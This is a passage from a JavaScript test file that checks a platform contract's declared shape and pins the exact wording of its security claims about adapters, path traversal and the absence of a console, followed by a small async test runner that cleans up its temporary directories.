  const reparsed = contract.parseShape(DECLARATION.shape, `${ID}.shape`)
  assert.equal(json(reparsed), json(DECLARATION.shape), 'the parsed shape is not stable under its own parser')

  // Every operation carries the two things `checkedCall` needs, or an operation is declared
  // and unenforceable — the state this contract's fifteen were in before the platform
  // declarations existed, when a prose table in `AGENTS.md` was the only description and it
  // was missing three of them.
  for (const op of DECLARATION.shape.operations) {
    assert.ok(typeof op.description === 'string' && op.description.length > 0, `${op.name} has no description`)
    assert.ok(Array.isArray(op.params), `${op.name} has no params list`)
    assert.ok(op.returns !== undefined, `${op.name} declares no return value, so nothing checks what it answers`)
  }
})

test('the declaration still says the thing the threat model corrects rather than a softened version', () => {
  // A relocation must not quietly change a claim, and this is the claim most worth pinning:
  // the description says "**Adapters only**", which is *intent* and not mechanism.
  // `chain.js`'s `NATIVE` maps by contract id alone, so any artifact whose manifest
  // declares the port holds this authority — `THREAT-MODEL.md` §1.2 is the correction and
  // it belongs there, because its reader is an operator deciding what to admit.
  //
  // What this case refuses is the tempting middle: editing the sentence here as part of the
  // move, in the commit nobody reviews for claims. If somebody decides the declaration
  // should say something else, that is a change to what every device reads through
  // `platform:documentation` and it fails here first.
  const said = String(DECLARATION.shape.description)
  assert.ok(/\*\*Adapters only\*\*/.test(said), said)
  assert.ok(/nothing else in the platform lets an artifact write a file a person will later execute/.test(said), said)
  assert.ok(/a traversal cannot be written/.test(said), said)
  assert.ok(/There is no console/.test(said), said)

  // And `profileEnsure`'s declared description still describes a block maintained by
  // replacement rather than a filter, which is the other place a softening would land.
  const profile = String(operation('profileEnsure').description)
  assert.ok(/by replacement rather than by appending/.test(profile), profile)
})

/* ─────────────────────────────── run them ───────────────────────────────── */

async function main () {
  t.plan(cases.length)
  try {
    for (const [name, fn] of cases) {
      try { await fn(); t.pass(name) } catch (err) { t.fail(`${name} — ${err instanceof Error ? err.message : err}`) }
    }
  } finally {
    for (const dir of dirs.splice(0)) {
      try { await fs.promises.rm(dir, { recursive: true, force: true }) } catch { /* best effort */ }
    }
  }
}

main()
